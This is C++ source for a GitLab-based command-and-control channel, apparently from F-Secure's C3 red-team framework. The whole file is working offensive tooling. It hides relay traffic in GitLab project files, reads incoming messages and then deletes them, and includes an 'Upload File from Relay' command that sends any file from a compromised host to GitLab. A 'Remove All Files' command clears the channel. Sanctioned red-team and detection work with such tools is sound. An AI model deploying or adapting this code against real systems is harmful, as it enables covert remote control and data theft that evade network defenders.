#include "Stdafx.h"
#include "Gitlab.h"
#include "Common/FSecure/Crypto/Base64.h"

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Gitlab::Gitlab(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [GitlabToken, channelName, userAgent] = arguments.Read<std::string, std::string, std::string>();
	m_gitlabObj = FSecure::GitlabApi{ GitlabToken, channelName, userAgent };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Gitlab::OnSendToChannel(ByteView data)
{
	// There is a cap on uploads of files >150mb at which point different APIs are required.
	data = data.SubString(0, 100 * 1024 * 1024);
	m_gitlabObj.WriteMessageToFile(m_outboundDirectionName, data);
	return data.size();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Gitlab::OnReceiveFromChannel()
{
	std::vector<ByteVector> ret;
	for (auto& [ts, id] : m_gitlabObj.GetMessagesByDirection(m_inboundDirectionName))
	{
		ret.push_back(m_gitlabObj.ReadFile(id));
		m_gitlabObj.DeleteFile(id);
	}

	return ret;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Gitlab::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		UploadFile(command);
		return {};
	case 1:
		DeleteAllFiles();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

void FSecure::C3::Interfaces::Channels::Gitlab::UploadFile(ByteView args)
{
	m_gitlabObj.UploadFile(args.Read<std::string>());
}


void FSecure::C3::Interfaces::Channels::Gitlab::DeleteAllFiles()
{
	m_gitlabObj.DeleteAllFiles();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Gitlab::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Gitlab token",
				"min": 1,
				"description": "This token is what channel needs to interact with Gitlab's API"
			},
			{
				"type": "string",
				"name": "Project name",
				"min": 4,
				"randomize": true,
				"description": "Project to create for channel"
			},
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning."
			}
		]
	},
	"commands":
	[
		{
			"name": "Upload File from Relay",
			"id": 0,
			"description": "Upload file from host running Relay directly to Gitlab",
			"arguments":
			[
				{
                    "type" : "string",
					"name": "Remote Filepath",
					"description" : "Path to upload."
				}
			]
		},
		{
			"name": "Remove All Files",
			"id": 1,
			"description": "Delete channel folder and all files within it.",
			"arguments": []
		}
	]
}
)_";
}
